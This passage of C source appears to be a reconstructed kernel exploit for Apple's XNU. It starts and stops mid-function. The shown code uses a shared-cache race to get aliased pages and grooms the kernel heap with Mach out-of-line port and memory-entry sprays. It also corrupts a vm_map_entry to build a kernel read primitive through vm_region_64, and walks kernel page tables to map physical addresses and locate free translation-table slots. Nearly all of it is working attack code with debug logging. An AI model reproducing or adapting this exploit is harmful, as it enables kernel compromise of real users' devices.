                cookie_count, zero_count, other_count,
                (unsigned long long)mask);
        for (uint32_t dp = 0; dp < page_count && dp < 4; dp++) {
            uint64_t val = *(uint64_t *)(race_base + page_sz * dp);
            klog("[alias] post[%u] val=0x%llx\n", dp, (unsigned long long)val);
        }
    }
    return result;
}

#pragma mark - sub_FD18: page protection toggle

static kern_return_t validate_aliased_pages(uint8_t *oc, uint8_t *race_output) {
    uint32_t page_count = RO_U32(race_output, RO_PAGE_COUNT);
    uint64_t mask = RO_U64(race_output, RO_MASK);
    int bits_set = __builtin_popcountll(mask);
    if (page_count == (uint32_t)bits_set) return 0;

    vm_size_t page_sz = vm_page_size;
    uint64_t base = RO_U64(race_output, RO_BASE);

    for (uint32_t pg = 0; pg < page_count; pg++) {
        if ((mask >> pg) & 1) continue;
        vm_address_t page_addr = base + page_sz * pg;

        kern_return_t kr = vm_protect(mach_task_self_, page_addr, page_sz,
                0, VM_PROT_NONE);
        if (kr) return kr | 0x80000000;

        kr = vm_protect(mach_task_self_, page_addr, page_sz, 0,
                VM_PROT_READ | VM_PROT_WRITE);
        if (kr) return kr | 0x80000000;

        mask |= (1ULL << pg);
        RO_U64(race_output, RO_MASK) = mask;
        page_count = RO_U32(race_output, RO_PAGE_COUNT);
    }
    return 0;
}

#pragma mark - sub_F860: vm_region_64-based kread

static kern_return_t kread_via_vmregion(uint8_t *ic, uint64_t kaddr,
        uint8_t *out_buf, uint32_t size, int validate) {
    if (!size) return 0;

    uint8_t *oc = g_outer_ctx;
    if (!oc) return 708609;

    uint64_t *map_entry = (uint64_t *)OC_U64(oc, OC_MAP_ENTRY_PTR);
    uint8_t *map_hdr = (uint8_t *)OC_U64(oc, OC_MAP_HDR_PTR);
    if (!map_entry || !map_hdr) return 708642;

    if (*(uint64_t *)(map_hdr + 24) != map_entry[2] ||
            *(uint64_t *)(map_hdr + 8) != OC_U64(oc, OC_MAP_BACKUP1) ||
            *map_entry != OC_U64(oc, OC_MAP_BACKUP2))
        return 708642;

    uint64_t page_mask = IC_U64(ic, IC_PAGE_MASK);
    uint32_t page_align = IC_U32(ic, IC_PAGE_ALIGN);
    uint64_t backup_field1 = OC_U64(oc, OC_MAP_BACKUP1);
    vm_size_t page_sz = vm_page_size;
    vm_address_t last_page = map_entry[3] - page_sz;

    uint64_t bytes_read = 0;
    uint64_t remaining = size;

    while (bytes_read < size) {
        uint64_t cur_addr = kaddr + bytes_read;
        uint64_t page_off = page_mask & cur_addr;

        size_t chunk;
        int use_extended;
        if (page_off + 64 <= page_align || page_off + remaining > page_align) {
            use_extended = 1;
            chunk = (remaining >= 16) ? 16 : remaining;
        } else {
            use_extended = 0;
            chunk = (remaining >= 2) ? 2 : remaining;
        }

        *(uint64_t *)(map_hdr + 8) = map_entry[1];

        madvise((void *)OC_U64(oc, OC_HEAP_BUF), 2 * page_sz, MADV_SEQUENTIAL);

        uint64_t saved_field1 = map_entry[1];
        uint64_t saved_field3 = map_entry[3];

        vm_address_t address = last_page;
        vm_size_t region_size = 0;
        mach_port_t object_name = 0;
        mach_msg_type_number_t info_cnt = 9;
        int info[9];
        memset(info, 0, sizeof(info));

        if (use_extended) {
            map_entry[1] = cur_addr - 16;
        } else {
            map_entry[1] = cur_addr - 78;
        }
        map_entry[3] = last_page;

        kern_return_t kr = vm_region_64(mach_task_self_, &address,
                &region_size, 9, (vm_region_info_t)info, &info_cnt,
                &object_name);

        map_entry[1] = saved_field1;
        map_entry[3] = saved_field3;
        *(uint64_t *)(map_hdr + 8) = backup_field1;

        OC_U64(oc, OC_KREAD_COUNT)++;

        if (kr) return kr | 0x80000000;

        uint8_t src[16];
        if (use_extended) {
            *(uint64_t *)src = (uint64_t)address;
            *(uint64_t *)(src + 8) = (uint64_t)(address + region_size);
        } else {
            *(uint16_t *)src = *(uint16_t *)((char *)info + 32);
        }

        memcpy(out_buf + bytes_read, src, chunk);
        bytes_read += chunk;
        remaining -= chunk;
    }

    return 0;
}

#pragma mark - kread helpers

static kern_return_t kread64(uint64_t kaddr, uint64_t *out) {
    return kread_via_vmregion(g_inner_ctx, kaddr, (uint8_t *)out, 8, 1);
}

static kern_return_t kread32(uint64_t kaddr, uint32_t *out) {
    return kread_via_vmregion(g_inner_ctx, kaddr, (uint8_t *)out, 4, 1);
}

#pragma mark - Kernel pointer validation

static int validate_kptr(uint8_t *ic, uint64_t ptr) {
    if (ptr < 0xFFFFFE0000000000ULL) return 0;
    if (ptr > 0xFFFFFFFFFFFFFFFFULL - 0x1000) return 0;
    return 1;
}

#pragma mark - PTE walk machinery

static uint64_t g_tte_va;
static uint64_t g_tte_pa;

static int pte_walk_init(void) {
    if (g_tte_va) return 1;
    if (!g_outer_ctx) return 0;

    uint64_t our_proc = OC_U64(g_outer_ctx, OC_KPTR);
    if (!our_proc || !validate_kptr(g_inner_ctx, our_proc)) return 0;
    uint64_t our_task = our_proc - 1840;

    #define KPTR_STRIP(v) (((v) & 0x0080000000000000ULL) ? ((v) | 0xFFFFFF8000000000ULL) : (v))

    uint64_t list_head = 0;
    kread64(our_task + 16, &list_head);
    list_head = KPTR_STRIP(list_head);
    klog("[kread] PTE: task+16 stripped = 0x%llx\n", (unsigned long long)list_head);
    if (!list_head || !validate_kptr(g_inner_ctx, list_head)) {
        klog("[kread] PTE: task+16 not valid after strip\n");
        return 0;
    }

    klog("[kread] PTE: walking task list from 0x%llx\n", (unsigned long long)list_head);
    uint64_t cur = list_head;
    uint64_t found = 0;
    for (int steps = 0; steps < 300; steps++) {
        if (!validate_kptr(g_inner_ctx, cur)) break;
        uint32_t pid = 0;
        kread32(cur + 96, &pid);
        if (pid == 0) { found = cur; break; }
        uint64_t next = 0;
        kread64(cur + 16, &next);
        next = KPTR_STRIP(next);
        if (!next || !validate_kptr(g_inner_ctx, next) || next == list_head) break;
        cur = next;
    }

    if (!found) {
        klog("[kread] PTE: kernel task (PID 0) not found in task list\n");
        return 0;
    }
    klog("[kread] PTE: kernel task node at 0x%llx\n", (unsigned long long)found);

    uint64_t target = 0;
    kread64(found + 24, &target);
    target = KPTR_STRIP(target);
    if (!validate_kptr(g_inner_ctx, target)) {
        klog("[kread] PTE: found+24 not valid (0x%llx)\n", (unsigned long long)target);
        return 0;
    }
    klog("[kread] PTE: target (found+24) = 0x%llx\n", (unsigned long long)target);

    uint64_t v22 = 0;
    kread64(target + 8, &v22);
    v22 = KPTR_STRIP(v22);
    if (!validate_kptr(g_inner_ctx, v22)) {
        klog("[kread] PTE: target+8 not valid (0x%llx), using target\n",
                (unsigned long long)v22);
        v22 = target;
    }
    klog("[kread] PTE: v22 (ctx+6616) = 0x%llx\n", (unsigned long long)v22);

    uint64_t ptr1 = 0;
    kread64(v22 + 40, &ptr1);
    ptr1 = KPTR_STRIP(ptr1);
    klog("[kread] PTE: v22+40 = 0x%llx%s\n", (unsigned long long)ptr1,
            validate_kptr(g_inner_ctx, ptr1) ? " (kptr)" : "");
    if (!validate_kptr(g_inner_ctx, ptr1)) return 0;

    uint64_t pmap = 0;
    kread64(ptr1 + 64, &pmap);
    pmap = KPTR_STRIP(pmap);
    klog("[kread] PTE: ptr1+64 = 0x%llx%s\n", (unsigned long long)pmap,
            validate_kptr(g_inner_ctx, pmap) ? " (kptr)" : "");
    if (!validate_kptr(g_inner_ctx, pmap)) return 0;

    uint64_t tte = 0, ttep = 0;
    kread64(pmap, &tte);
    kread64(pmap + 8, &ttep);
    klog("[kread] PTE: pmap[0]=0x%llx pmap[8]=0x%llx\n",
            (unsigned long long)tte, (unsigned long long)ttep);

    tte = KPTR_STRIP(tte);
    if (!validate_kptr(g_inner_ctx, tte)) return 0;

    g_tte_va = tte;
    g_tte_pa = ttep;
    klog("[kread] PTE walk INIT OK: tte=0x%llx ttep=0x%llx\n",
            (unsigned long long)g_tte_va, (unsigned long long)g_tte_pa);
    #undef KPTR_STRIP
    return 1;
}

#define MAX_CACHED_SEGS 32
static struct { uint64_t phys, virt, size; } g_cached_segs[MAX_CACHED_SEGS];
static int g_cached_seg_count = 0;

static void populate_seg_cache(void) {
    if (g_cached_seg_count) return;
    uint64_t seg_count = IC_U64(g_inner_ctx, 1496);
    uint64_t seg_table = IC_U64(g_inner_ctx, 1504);
    if (!seg_count || !seg_table || seg_count > MAX_CACHED_SEGS) return;
    for (uint64_t i = 0; i < seg_count; i++) {
        uint64_t size_raw = 0;
        kread64(seg_table + i * 24, &g_cached_segs[i].phys);
        kread64(seg_table + i * 24 + 8, &g_cached_segs[i].virt);
        kread64(seg_table + i * 24 + 16, &size_raw);
        g_cached_segs[i].size = size_raw << 14;
    }
    g_cached_seg_count = (int)seg_count;
}

static uint64_t pa_to_kva(uint64_t pa) {
    populate_seg_cache();
    for (int i = 0; i < g_cached_seg_count; i++) {
        if (pa >= g_cached_segs[i].phys &&
                pa < g_cached_segs[i].phys + g_cached_segs[i].size)
            return g_cached_segs[i].virt + (pa - g_cached_segs[i].phys);
    }
    return 0;
}

static uint64_t pte_walk(uint64_t kva) {
    if (!pte_walk_init()) return 0;

    uint64_t tte_readable = pa_to_kva(g_tte_pa);
    if (!tte_readable) return 0;

    uint64_t l0_addr = tte_readable + 8 * ((kva >> 36) & 7);
    uint64_t l0_pte = 0;
    if (kread64(l0_addr, &l0_pte) || !(l0_pte & 3)) return 0;

    uint64_t l1_pa = l0_pte & 0xFFFFFFFFC000ULL;
    uint64_t l1_va = pa_to_kva(l1_pa);
    if (!l1_va) {
        klog("[kread] pte_walk L1: pa_to_kva(0x%llx) = 0\n", (unsigned long long)l1_pa);
        return 0;
    }
    uint64_t l1_addr = l1_va + ((kva >> 22) & 0x3FF8);
    uint64_t l1_pte = 0;
    if (kread64(l1_addr, &l1_pte) || !(l1_pte & 3)) return 0;
    if ((l1_pte & 3) == 1)
        return (l1_pte & 0xFFFFFFFFC000ULL) | (kva & 0x1FFFFFF);

    uint64_t l2_pa = l1_pte & 0xFFFFFFFFC000ULL;
    uint64_t l2_va = pa_to_kva(l2_pa);
    if (!l2_va) {
        klog("[kread] pte_walk L2: pa_to_kva(0x%llx) = 0\n", (unsigned long long)l2_pa);
        return 0;
    }
    uint64_t l2_addr = l2_va + ((kva >> 11) & 0x3FF8);
    uint64_t l2_pte = 0;
    if (kread64(l2_addr, &l2_pte)) return 0;
    if ((~l2_pte & 3) != 0) return 0;

    return (l2_pte & 0xFFFFFFFFC000ULL) | (kva & 0x3FFF);
}

uint64_t kva_to_pa(uint64_t kva) {
    populate_seg_cache();
    for (int i = 0; i < g_cached_seg_count; i++) {
        if (kva >= g_cached_segs[i].virt &&
                kva < g_cached_segs[i].virt + g_cached_segs[i].size)
            return g_cached_segs[i].phys + (kva - g_cached_segs[i].virt);
    }
    return pte_walk(kva);
}

int kernel_pte_walk_full(uint64_t kva,
                         uint64_t *out_leaf_pte_kva,
                         uint64_t *out_leaf_pte_val,
                         uint64_t *out_page_pa) {
    if (!pte_walk_init()) return -1;

    uint64_t tte_readable = pa_to_kva(g_tte_pa);
    if (!tte_readable) return -2;

    uint64_t l0_addr = tte_readable + 8 * ((kva >> 36) & 7);
    uint64_t l0_pte = 0;
    if (kread64(l0_addr, &l0_pte)) return -3;
    if ((l0_pte & 3) == 0) return -4;

    uint64_t l1_pa = l0_pte & 0xFFFFFFFFC000ULL;
    uint64_t l1_va = pa_to_kva(l1_pa);
    if (!l1_va) return -5;
    uint64_t l1_addr = l1_va + ((kva >> 22) & 0x3FF8);
    uint64_t l1_pte = 0;
    if (kread64(l1_addr, &l1_pte)) return -6;
    if ((l1_pte & 1) == 0) return -7;

    if ((l1_pte & 3) == 1) {
        if (out_leaf_pte_kva) *out_leaf_pte_kva = l1_addr;
        if (out_leaf_pte_val) *out_leaf_pte_val = l1_pte;
        if (out_page_pa)      *out_page_pa      = (l1_pte & 0xFFFFFFE000000ULL) | (kva & 0x1FFFFFF);
        return 0;
    }

    uint64_t l2_pa = l1_pte & 0xFFFFFFFFC000ULL;
    uint64_t l2_va = pa_to_kva(l2_pa);
    if (!l2_va) return -8;
    uint64_t l2_addr = l2_va + ((kva >> 11) & 0x3FF8);
    uint64_t l2_pte = 0;
    if (kread64(l2_addr, &l2_pte)) return -9;
    if ((~l2_pte & 3) != 0) return -10;

    if (out_leaf_pte_kva) *out_leaf_pte_kva = l2_addr;
    if (out_leaf_pte_val) *out_leaf_pte_val = l2_pte;
    if (out_page_pa)      *out_page_pa      = (l2_pte & 0xFFFFFFFFC000ULL) | (kva & 0x3FFF);
    return 0;
}

int find_free_kernel_l2_slot(uint64_t witness_kva, uint64_t *out_l1_pa, uint64_t *out_free_off,
                             uint64_t *out_window_va, uint64_t *out_l1_table_kva) {
    if (!pte_walk_init()) return -1;
    uint64_t tte_readable = pa_to_kva(g_tte_pa);
    if (!tte_readable) return -2;
    uint64_t l0_pte = 0;
    if (kread64(tte_readable + 8 * ((witness_kva >> 36) & 7), &l0_pte) || (l0_pte & 3) == 0) return -3;
    uint64_t l1_pa = l0_pte & 0xFFFFFFFFC000ULL;
    uint64_t l1_va = pa_to_kva(l1_pa);
    if (!l1_va) return -4;
    int free_i = -1;
    for (int i = 2047; i >= 0; i--) {
        uint64_t e = 0;
        if (kread64(l1_va + (uint64_t)i * 8, &e)) return -5;
        if ((e & 1) == 0) { free_i = i; break; }
    }
    if (free_i < 0) return -6;
    *out_l1_pa      = l1_pa;
    *out_free_off   = (uint64_t)free_i * 8;
    *out_window_va  = (witness_kva & ~0xFFFFFFFFFULL) + ((uint64_t)free_i << 25);
    if (out_l1_table_kva) *out_l1_table_kva = l1_va;
    return 0;
}

uint64_t pte_scan_for_physaddr(uint64_t target_pa) {
    if (!pte_walk_init()) {
        klog("[pscan] pte_walk_init failed\n");
        return 0;
    }
    populate_seg_cache();

    uint64_t l0_va = pa_to_kva(g_tte_pa);
    if (!l0_va) {
        klog("[pscan] pa_to_kva(tte_pa=0x%llx) = 0\n",
                (unsigned long long)g_tte_pa);
        return 0;
    }

    const uint64_t TARGET_PAGE = target_pa & ~0x3FFFULL;
    const uint64_t TARGET_OFF  = target_pa &  0x3FFFULL;
    const uint64_t KVA_PREFIX  = 0xFFFFFF8000000000ULL;

    long total_l2_checks = 0;
    long total_l1_blocks = 0;
    long total_l1_tables = 0;

    klog("[pscan] scan begin: target PA=0x%llx, TTBR1 KVA=0x%llx\n",
            (unsigned long long)target_pa, (unsigned long long)l0_va);

    for (int l0_idx = 0; l0_idx < 8; l0_idx++) {
        uint64_t l0_pte = 0;
        if (kread64(l0_va + 8 * l0_idx, &l0_pte)) continue;
        if ((l0_pte & 3) != 3) continue;

        uint64_t l1_pa = l0_pte & 0xFFFFFFFFC000ULL;
        uint64_t l1_va = pa_to_kva(l1_pa);
        if (!l1_va) {
            klog("[pscan] L0[%d] valid (l1_pa=0x%llx) but pa_to_kva failed -- skip\n",
                    l0_idx, (unsigned long long)l1_pa);
            continue;
        }
        klog("[pscan] L0[%d] -> L1 table at KVA 0x%llx\n", l0_idx, (unsigned long long)l1_va);

        for (int l1_idx = 0; l1_idx < 2048; l1_idx++) {
            uint64_t l1_pte = 0;
            if (kread64(l1_va + 8 * l1_idx, &l1_pte)) continue;
            if ((l1_pte & 1) == 0) continue;

            if ((l1_pte & 3) == 1) {
                total_l1_blocks++;
                uint64_t block_pa = l1_pte & 0xFFFFFFE000000ULL;
                if (block_pa <= target_pa && target_pa < block_pa + 0x2000000ULL) {
                    uint64_t va = ((uint64_t)l0_idx << 36)
                                | ((uint64_t)l1_idx << 25)
                                | (target_pa - block_pa);
                    va |= KVA_PREFIX;
                    klog("[pscan] L1 BLOCK hit: PA 0x%llx -> KVA 0x%llx (l0=%d l1=%d)\n",
                            (unsigned long long)target_pa,
                            (unsigned long long)va, l0_idx, l1_idx);
                    return va;
                }
                continue;
            }

            total_l1_tables++;
            uint64_t l2_pa = l1_pte & 0xFFFFFFFFC000ULL;
            uint64_t l2_va = pa_to_kva(l2_pa);
            if (!l2_va) continue;

            if ((total_l1_tables & 0x1F) == 0)
                klog("[pscan] progress: L0[%d] L1[%d] tables_walked=%ld l2_checks=%ld\n",
                        l0_idx, l1_idx, total_l1_tables, total_l2_checks);

            for (int l2_idx = 0; l2_idx < 2048; l2_idx++) {
                uint64_t l2_pte = 0;
                total_l2_checks++;
                if (kread64(l2_va + 8 * l2_idx, &l2_pte)) continue;
                if ((l2_pte & 1) == 0) continue;
                if ((l2_pte & 0xFFFFFFFFC000ULL) == TARGET_PAGE) {
                    uint64_t va = ((uint64_t)l0_idx << 36)
                                | ((uint64_t)l1_idx << 25)
                                | ((uint64_t)l2_idx << 14)
                                | TARGET_OFF;
                    va |= KVA_PREFIX;
                    klog("[pscan] L2 PAGE hit: PA 0x%llx -> KVA 0x%llx (l0=%d l1=%d l2=%d, %ld checks)\n",
                            (unsigned long long)target_pa,
                            (unsigned long long)va,
                            l0_idx, l1_idx, l2_idx, total_l2_checks);
                    return va;
                }
            }
        }
    }
    klog("[pscan] PA 0x%llx NOT FOUND: %ld L1 tables scanned, %ld L2 checks, %ld L1 blocks\n",
            (unsigned long long)target_pa,
            total_l1_tables, total_l2_checks, total_l1_blocks);
    return 0;
}

#pragma mark - Mach message helpers for OOL grooming

typedef struct {
    mach_msg_header_t header;
    mach_msg_body_t body;
    mach_msg_ool_ports_descriptor_t ports;
} ool_ports_msg_t;

static kern_return_t send_ool_ports(mach_port_t dest, void *port_buf,
        uint32_t count) {
    ool_ports_msg_t msg;
    memset(&msg, 0, sizeof(msg));
    msg.header.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_MAKE_SEND_ONCE,
            0, 0, MACH_MSGH_BITS_COMPLEX);
    msg.header.msgh_size = sizeof(msg);
    msg.header.msgh_remote_port = dest;
    msg.header.msgh_id = 1;
    msg.body.msgh_descriptor_count = 1;
    msg.ports.address = port_buf;
    msg.ports.count = count;
    msg.ports.deallocate = 0;
    msg.ports.copy = MACH_MSG_PHYSICAL_COPY;
    msg.ports.disposition = MACH_MSG_TYPE_MOVE_SEND;
    msg.ports.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;

    return mach_msg(&msg.header, MACH_SEND_MSG | MACH_SEND_TIMEOUT,
            sizeof(msg), 0, 0, 0, 0);
}

#pragma mark - Grooming loop from sub_CEB8 lines 579-960

static kern_return_t groom_and_scan(uint8_t *ic, uint8_t *oc,
        uint8_t *race_output, unsigned int slot_idx) {
    vm_size_t page_sz = vm_page_size;
    uint32_t page_count = RO_U32(race_output, RO_PAGE_COUNT);
    if (!page_count) return 708620;

    uint64_t base = RO_U64(race_output, RO_BASE);
    if (!base) return 708620;

    uint32_t version = IC_U32(ic, IC_VERSION);
    uint64_t kern_ver = IC_U64(ic, IC_KERNEL_VER);
    uint64_t kptr_offset;
    uint64_t struct_offset;
    uint64_t elem_offset;

    if (kern_ver > 0x27120080CFFFFFULL ||
        (kern_ver >= 0x225C23801AF00EULL && version < 10002)) {
        struct_offset = 184;
        elem_offset = 88;
    } else {
        struct_offset = 176;
        elem_offset = 80;
    }
    kptr_offset = elem_offset;

    uint32_t page_align = IC_U32(ic, IC_PAGE_ALIGN);
    uint64_t page_mask = IC_U64(ic, IC_PAGE_MASK);
    uint64_t heap_buf = OC_U64(oc, OC_HEAP_BUF);
    uint64_t heap_size = OC_U64(oc, OC_HEAP_SIZE);
    uint64_t heap_end = heap_buf + heap_size;
    uint64_t scan_lo = heap_buf + 4 * page_sz;
    uint64_t scan_hi = heap_end - 4 * page_sz;

    uint64_t *cookie2_ptr = (uint64_t *)((char *)oc + OC_RAND_COOKIE2);
    uint64_t mask = RO_U64(race_output, RO_MASK);
    mach_port_t *spray_port = (mach_port_t *)((char *)oc + OC_REPLY_PORTS +
            4 * slot_idx);
    uint32_t *port_array = (uint32_t *)OC_U64(oc, OC_PORT_ARRAY);
    uint32_t port_array_cnt = OC_U32(oc, OC_PORT_ARRAY_CNT);

    uint64_t version_field = OC_U64(oc, OC_VERSION_FIELD);
    int neg_version = -(int)version_field;

    void *found_page = NULL;
    uint64_t found_kptr = 0;
    uint32_t elem_size = OC_U32(oc, OC_ELEM_SIZE);
    uint32_t diag_cookie_pages = 0, diag_changed_pages = 0, diag_skipped_pages = 0;
    uint32_t diag_link_hits = 0, diag_size_hits = 0, diag_kptr_hits = 0;

    klog("[groom] stride=%u struct_off=%llu kptr_off=%llu vfield=0x%llx mask=0x%llx cnt=%u\n",
            elem_size, (unsigned long long)struct_offset,
            (unsigned long long)kptr_offset,
            (unsigned long long)version_field, (unsigned long long)mask,
            port_array_cnt);

    for (uint32_t value = 0; value < port_array_cnt; value++) {
        if (value > 0 && (value % (uint32_t)version_field) == 0) {
            uint64_t temp_buf = OC_U64(oc, OC_TEMP_BUF);
            if (version_field > 0) {
                for (uint32_t k = 0; k < (uint32_t)version_field; k++) {
                    ((uint32_t *)temp_buf)[k] =
                            port_array[neg_version + k];
                    port_array[neg_version + k] = 0;
                }
            }
            kern_return_t kr = send_ool_ports(*spray_port,
                    (void *)temp_buf, (uint32_t)version_field);
            if (kr) break;
        }

        mach_port_t entry = 0;
        vm_size_t entry_size = page_sz;
        int flags = found_page ? 67248131 : 67239939;
        kern_return_t kr = mach_make_memory_entry(mach_task_self_,
                &entry_size, 0, flags, &entry, 0);
        if (kr) {
            if (value < 3) klog("[groom] mem_entry FAIL at value=%u flags=0x%x kr=0x%x\n",
                    value, flags, kr);
            break;
        }

        port_array[value] = entry;

        for (uint32_t pg = 0; pg < page_count; pg++) {
            if ((mask >> pg) & 1) continue;
            uint64_t *page_ptr = (uint64_t *)(base + page_sz * pg);
            if (*page_ptr == *cookie2_ptr) { diag_cookie_pages++; continue; }
            diag_changed_pages++;
            if (page_sz == 0) goto mark_skip;

            for (uint32_t off = 0; off < page_sz; off += elem_size) {
                uint32_t *elem = (uint32_t *)((char *)page_ptr + off);
                if (elem[10] > 0x80) goto mark_skip;
                if (!elem[0] || elem[0] != elem[1]) continue;
                diag_link_hits++;

                uint8_t byteCheck = *((uint8_t *)elem + 164);
                uint32_t type40 = elem[10];
                if (byteCheck == 0x80 || type40 != 1) continue;

                uint64_t entry_size_val = *(uint64_t *)((char *)elem + 24);
                if (entry_size_val != page_sz) continue;
                diag_size_hits++;

                if (!found_page) {
                    uint64_t kptr = *(uint64_t *)((char *)elem + struct_offset);
                    if (!validate_kptr(ic, kptr)) { diag_kptr_hits++; continue; }

                    port_array[value] = 0;
                    OC_U32(oc, OC_FOUND_MEM_ENTRY) = entry;
                    OC_U64(oc, OC_FOUND_KPTR_BASE) = kptr - struct_offset;
                    found_page = elem;
                    found_kptr = kptr;
                } else {
                    uint64_t kptr2 = *(uint64_t *)((char *)elem + kptr_offset);
                    if (!validate_kptr(ic, kptr2)) continue;

                    mask |= (1ULL << pg);
                    RO_U64(race_output, RO_MASK) = mask;
                    OC_U64(oc, OC_KPTR) = kptr2;
                    OC_U64(oc, OC_ALIASED_PAGE) = (uint64_t)found_page;
                    return 0;
                }
            }
            continue;
mark_skip:
            diag_skipped_pages++;
            mask |= (1ULL << pg);
            RO_U64(race_output, RO_MASK) = mask;
        }

        int bits_set = __builtin_popcountll(mask);
        if ((uint32_t)bits_set == page_count) break;
        neg_version++;
    }

    klog("[groom] done: cookie=%u changed=%u skipped=%u link=%u size=%u kptr_fail=%u found=%p\n",
            diag_cookie_pages, diag_changed_pages, diag_skipped_pages,
            diag_link_hits, diag_size_hits, diag_kptr_hits, found_page);

    if (found_kptr && validate_kptr(ic, found_kptr)) {
        if (found_page)
            OC_U64(oc, OC_ALIASED_PAGE) = (uint64_t)found_page;
        return 0;
    }

    return 708620;
}

#pragma mark - Second race loop + mach_msg receive for OOL mapping

static kern_return_t find_ool_mapping(uint8_t *ic, uint8_t *oc,
        unsigned int start_slot) {
    vm_size_t page_sz = vm_page_size;
    uint64_t page_mask = IC_U64(ic, IC_PAGE_MASK);
    uint32_t page_align = IC_U32(ic, IC_PAGE_ALIGN);

    for (unsigned int slot = start_slot; slot < RACE_SLOT_COUNT; slot++) {
        uint8_t *race_out = (uint8_t *)oc + RACE_SLOT_SIZE * slot + RACE_OUT_OFF;
        uint64_t base = RO_U64(race_out, RO_BASE);
        uint32_t page_count = RO_U32(race_out, RO_PAGE_COUNT);

        if (!base || !RO_U64(race_out, RO_ALLOC_SIZE)) {
            kern_return_t kr = shared_cache_race(ic, oc, 16, race_out);
            if (kr) continue;
            kr = detect_aliased_pages(oc, race_out);
            if (kr) continue;
            base = RO_U64(race_out, RO_BASE);
            page_count = RO_U32(race_out, RO_PAGE_COUNT);
        }

        uint64_t mask = 0;
        if (page_count > 64) continue;

        uint64_t heap_buf = OC_U64(oc, OC_HEAP_BUF);
        uint64_t heap_size = OC_U64(oc, OC_HEAP_SIZE);

        uint32_t mod_start = 0;
        if (IC_U64(ic, IC_KERNEL_VER) >> 43 >= 0x44B)
            mod_start = page_align % 0x50;

        klog("[ool] slot %u: scanning %u pages base=0x%llx\n",
                slot, page_count, (unsigned long long)base);

        uint32_t spray_idx = OC_U32(oc, OC_PORT_IDX);
        int ool_found = 0;
        while (!ool_found) {
            while (spray_idx < 256 &&
                   (OC_U32(oc, OC_SPRAY_PORTS + 4 * spray_idx) == 0 ||
                    OC_U32(oc, OC_PORT_COUNTS + 4 * spray_idx) >= 0x400)) {
                spray_idx++;
            }
            if (spray_idx >= 256) goto next_slot;

            struct {
                mach_msg_header_t hdr;
                mach_msg_body_t body;
                mach_msg_ool_descriptor_t ool;
            } msg;
            memset(&msg, 0, sizeof(msg));
            msg.hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0) |
                    MACH_MSGH_BITS_COMPLEX;
            msg.hdr.msgh_size = sizeof(msg);
            msg.hdr.msgh_remote_port = OC_U32(oc, OC_SPRAY_PORTS + 4 * spray_idx);
            msg.hdr.msgh_local_port = MACH_PORT_NULL;
            msg.hdr.msgh_id = 1;
            msg.body.msgh_descriptor_count = 1;
            msg.ool.address = (void *)heap_buf;
            msg.ool.size = (mach_msg_size_t)heap_size;
            msg.ool.deallocate = FALSE;
            msg.ool.copy = MACH_MSG_VIRTUAL_COPY;
            msg.ool.type = MACH_MSG_OOL_DESCRIPTOR;

            kern_return_t mkr = mach_msg(&msg.hdr, MACH_SEND_MSG, sizeof(msg),
                    0, 0, 0, 0);
            if (mkr) {
                klog("[ool] send FAIL port %u kr=0x%x\n", spray_idx, mkr);
                continue;
            }
            OC_U32(oc, OC_PORT_IDX) = spray_idx;
            OC_U32(oc, OC_PORT_COUNTS + 4 * spray_idx)++;

            for (uint32_t pg = 0; pg < page_count; pg++) {
                if ((mask >> pg) & 1) continue;
                uint64_t *page_ptr = (uint64_t *)(base + page_sz * pg);
                if (*page_ptr == OC_U64(oc, OC_RAND_COOKIE2)) continue;

                for (uint32_t off = mod_start; off < page_align; off += 80) {
                    uint64_t *entry = (uint64_t *)((char *)page_ptr + off);
                    uint64_t entry_start = entry[0];
                    if ((uint64_t)(entry_start - 1) < 0xFFFEFFFFFFFFFFFFULL)
                        break;

                    if ((entry[8] & 0xFFF) != 0xCC) continue;

                    uint64_t entry_vm_start = entry[2];
                    uint64_t entry_vm_end = entry[3];
                    if (entry_vm_start <= heap_buf + 4 * page_sz) continue;
                    if (entry_vm_end >= heap_buf + heap_size - 4 * page_sz) continue;

                    uint8_t *hdr = (uint8_t *)page_ptr + (page_mask & entry_start);
                    if (*(uint64_t *)(hdr + 24) != entry_vm_start) continue;

                    klog("[ool] FOUND vm_map_entry at slot %u page %u off %u\n",
                            slot, pg, off);

                    OC_U64(oc, OC_MAP_BACKUP2) = entry_start;
                    OC_U64(oc, OC_MAP_BACKUP1) = *(uint64_t *)(hdr + 8);
                    OC_U64(oc, OC_MAP_ENTRY_PTR) = (uint64_t)entry;
                    OC_U64(oc, OC_MAP_HDR_PTR) = (uint64_t)hdr;
                    ool_found = 1;
                    goto ool_entry_found;
                }
            }
        }
        goto next_slot;
ool_entry_found:

        {
            uint32_t recv_idx = OC_U32(oc, OC_PORT_IDX);
            uint32_t recv_count = 0;
            klog("[ool] receive phase: port_idx=%u\n", recv_idx);
            while (1) {
                uint32_t cnt = OC_U32(oc, OC_PORT_COUNTS + 4 * recv_idx);
                if (!cnt) {
                    if (recv_idx == 0) break;
                    recv_idx--;
                    continue;
                }

                mach_port_t recv_port = OC_U32(oc, OC_SPRAY_PORTS + 4 * recv_idx);
                uint8_t recv_buf[64];
                memset(recv_buf, 0, sizeof(recv_buf));
                mach_msg_header_t *recv_hdr = (mach_msg_header_t *)recv_buf;
                kern_return_t rkr = mach_msg(recv_hdr, MACH_RCV_MSG, 0,
                        sizeof(recv_buf), recv_port, 0, 0);
                if (rkr) {
                    klog("[ool] recv FAIL kr=0x%x\n", rkr);
                    return rkr | 0x80000000;
                }

                if (!(recv_hdr->msgh_bits & MACH_MSGH_BITS_COMPLEX)) {
                    mach_msg_destroy(recv_hdr);
                    klog("[ool] recv: not complex\n");
                    break;
                }
                mach_msg_body_t *body = (mach_msg_body_t *)(recv_hdr + 1);
                if (body->msgh_descriptor_count != 1) {
                    mach_msg_destroy(recv_hdr);
                    klog("[ool] recv: desc_count=%u\n", body->msgh_descriptor_count);
                    break;
                }
                mach_msg_ool_descriptor_t *desc =
                        (mach_msg_ool_descriptor_t *)(body + 1);
                if (desc->type != MACH_MSG_OOL_DESCRIPTOR) {
                    mach_msg_destroy(recv_hdr);
                    klog("[ool] recv: type=%u\n", desc->type);
                    break;
                }

                vm_address_t ool_addr = (vm_address_t)desc->address;
                vm_size_t ool_size = desc->size;

                desc->address = NULL;
                desc->size = 0;
                mach_msg_destroy(recv_hdr);

                OC_U32(oc, OC_PORT_COUNTS + 4 * recv_idx)--;
                recv_count++;

